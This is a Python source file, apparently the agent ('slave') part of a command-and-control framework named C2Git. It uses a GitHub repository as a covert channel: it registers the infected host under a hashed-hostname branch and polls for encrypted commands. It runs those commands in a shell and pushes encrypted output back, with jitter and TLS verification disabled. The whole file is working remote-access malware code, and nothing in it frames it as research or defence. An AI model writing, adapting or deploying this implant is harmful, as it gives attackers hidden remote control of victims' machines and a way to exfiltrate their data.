#!/usr/bin/env python3

import argparse
import asyncio
import base64
import datetime
import hashlib
import logging
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional, Tuple

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class Config:
    def __init__(self):
        self.key = os.getenv('SLAVE_KEY', 'C2GIT_SLAVE_KEY_REPLACEMENT')
        self.github_token = os.getenv('GITHUB_TOKEN', 'C2GIT_GITHUB_TOKEN_REPLACEMENT')
        self.repo_url = f"https://{self.github_token}@github.com/C2GIT_REPO_USER_REPLACEMENT/C2GIT_REPO_NAME_REPLACEMENT.git"
        self.check_interval = int(os.getenv('CHECK_INTERVAL', 'C2GIT_HEARTBEAT_INTERVAL_REPLACEMENT'))
        self.jitter = int(os.getenv('JITTER', 'C2GIT_JITTER_REPLACEMENT'))
        self.repo_path = Path(os.getenv('REPO_PATH', 'C2GIT_SLAVE_REPO_PATH_REPLACEMENT'))
        
        # Generate branch name from hostname
        hostname = os.uname().nodename if sys.platform != "win32" else os.environ['COMPUTERNAME']
        self.branch_name = hashlib.md5(hostname.encode()).hexdigest()[:10]

class Crypto:
    def __init__(self, key: str):
        self.key = key
        
    def _run_openssl(self, data: str, decrypt: bool = False) -> Optional[str]:
        try:
            cmd = [
                'openssl', 'enc', '-aes-256-cbc',
                '-pbkdf2', '-iter', '100000',
                '-salt', '-base64', '-A'
            ]
            if decrypt:
                cmd.append('-d')
            cmd.extend(['-pass', f'pass:{self.key}'])

            proc = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            if decrypt:
                stdout, stderr = proc.communicate(data.encode('utf-8') + b'\n')
            else:
                stdout, stderr = proc.communicate(data.encode('utf-8'))
            
            if proc.returncode != 0:
                logger.error(f"OpenSSL error: {stderr.decode('utf-8', errors='replace')}")
                return None
                
            return stdout.decode('utf-8', errors='replace').strip()
        except Exception as e:
            logger.error(f"OpenSSL operation failed: {e}")
            return None

    def encrypt(self, text: str) -> str:
        try:
            return self._run_openssl(text, decrypt=False)
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            return None

    def decrypt(self, encrypted_text: str) -> Optional[str]:
        try:
            return self._run_openssl(encrypted_text, decrypt=True)
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None

class GitHandler:
    def __init__(self, config: Config):
        self.config = config
        
    async def git_cmd(self, *args: str, check_output: bool = False) -> Optional[str]:
        cmd = ["git", "-c", "credential.helper=", "-c", "http.sslVerify=false"] + list(args)
        try:
            if check_output:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=self.config.repo_path
                )
                stdout, stderr = await proc.communicate()
                if proc.returncode != 0:
                    logger.error(f"Git command failed: {stderr.decode()}")
                    return None
                return stdout.decode().strip()
            else:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                    cwd=self.config.repo_path
                )
                await proc.wait()
                return None if proc.returncode != 0 else ""
        except Exception as e:
            logger.error(f"Git command error: {e}")
            return None
        
    async def init_repo(self):
        self.config.repo_path.mkdir(parents=True, exist_ok=True)
        os.chdir(self.config.repo_path)
        
        if not (self.config.repo_path / '.git').exists():
            await self.git_cmd("clone", self.config.repo_url, ".")
            await self.git_cmd("config", "user.email", "C2GIT_GIT_USER_EMAIL_REPLACEMENT")
            await self.git_cmd("config", "user.name", "C2GIT_GIT_USER_NAME_REPLACEMENT")
        
        # Setup branch
        await self.git_cmd("fetch", "origin")
        
        if not await self.git_cmd("checkout", self.config.branch_name):
            await self.git_cmd("checkout", "-b", self.config.branch_name)
            # Create encrypted host file
            hostname = os.uname().nodename if sys.platform != "win32" else os.environ['COMPUTERNAME']
            crypto = Crypto(self.config.key)
            encrypted_host = crypto.encrypt(hostname)
            
            (self.config.repo_path / 'host').write_text(encrypted_host)
            (self.config.repo_path / 'state').write_text('2')
            
            await self.git_cmd("add", "host", "state")
            await self.git_cmd("commit", "-m", f"Initialize branch {self.config.branch_name} with hostname")
            await self.git_cmd("push", "-u", "origin", self.config.branch_name)

    async def update_heartbeat(self) -> bool:
        try:
            await self.git_cmd("fetch", "origin", self.config.branch_name)
            await self.git_cmd("reset", "--hard", f"origin/{self.config.branch_name}")
            
            (self.config.repo_path / 'README.md').write_text(
                datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            )
            
            await self.git_cmd("add", "README.md")
            await self.git_cmd("commit", "-m", "Heartbeat")
            await self.git_cmd("push", "origin", self.config.branch_name)
            return True
        except Exception as e:
            logger.error(f"Failed to update heartbeat: {e}")
            return False

class Slave:
    def __init__(self, config: Config, verbose: bool = False):
        self.config = config
        self.crypto = Crypto(config.key)
        self.git_handler = GitHandler(config)
        if verbose:
            logger.setLevel(logging.DEBUG)
    
    async def execute_command(self, encrypted_cmd: str) -> Tuple[str, int]:
        cmd = self.crypto.decrypt(encrypted_cmd)
        if not cmd:
            return self.crypto.encrypt("Failed to decrypt command"), 1
        
        logger.debug(f"Executing command: {cmd}")
        
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
            if not output:
                output = "Command executed successfully with no output"
            
            return self.crypto.encrypt(output), process.returncode
        except Exception as e:
            error_msg = f"Command failed: {str(e)}"
            return self.crypto.encrypt(error_msg), 1

    async def run(self):
        await self.git_handler.init_repo()
        last_command = ""
        
        while True:
            try:
                # Sync with remote
                await self.git_handler.git_cmd("fetch", "origin", self.config.branch_name)
                await self.git_handler.git_cmd("reset", "--hard", f"origin/{self.config.branch_name}")
                
                # Update heartbeat
                await self.git_handler.update_heartbeat()
                
                state_file = self.config.repo_path / 'state'
                command_file = self.config.repo_path / 'command.txt'
                
                if not state_file.exists() or not command_file.exists():
                    await asyncio.sleep(self.config.check_interval)
                    continue
                
                state = state_file.read_text().strip()
                current_command = command_file.read_text().strip()
                
                if not state.isdigit() or int(state) not in [0, 1, 2]:
                    logger.error(f"Invalid state: {state}")
                    await asyncio.sleep(self.config.check_interval)
                    continue
                
                if state == '0' and current_command and current_command != last_command:
                    logger.debug(f"Executing command: {current_command}")
                    output, exit_code = await self.execute_command(current_command)
                    
                    (self.config.repo_path / 'response.txt').write_text(output)
                    state_file.write_text('1')
                    last_command = current_command
                    
                    await self.git_handler.git_cmd("add", "response.txt", "state")
                    await self.git_handler.git_cmd("commit", "-m", "Command response")
                    await self.git_handler.git_cmd("push", "origin", self.config.branch_name)
                
                elif state == '1':
                    await self.git_handler.git_cmd("fetch", "origin", self.config.branch_name)
                    remote_state = await self.git_handler.git_cmd(
                        "show", f"origin/{self.config.branch_name}:state",
                        check_output=True
                    )
                    
                    if remote_state == '2':
                        await self.git_handler.git_cmd("reset", "--hard", f"origin/{self.config.branch_name}")
                
                # Add jitter to avoid synchronization
                jitter = time.time() % self.config.jitter
                await asyncio.sleep(self.config.check_interval + jitter)
                
            except Exception as e:
                logger.error(f"Error in main loop: {e}")
                await asyncio.sleep(5)

async def main():
    parser = argparse.ArgumentParser(description='C2Git Slave in Python')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging')
    args = parser.parse_args()
    
    config = Config()
    slave = Slave(config, args.verbose)
    await slave.run()

if __name__ == '__main__':
    asyncio.run(main())
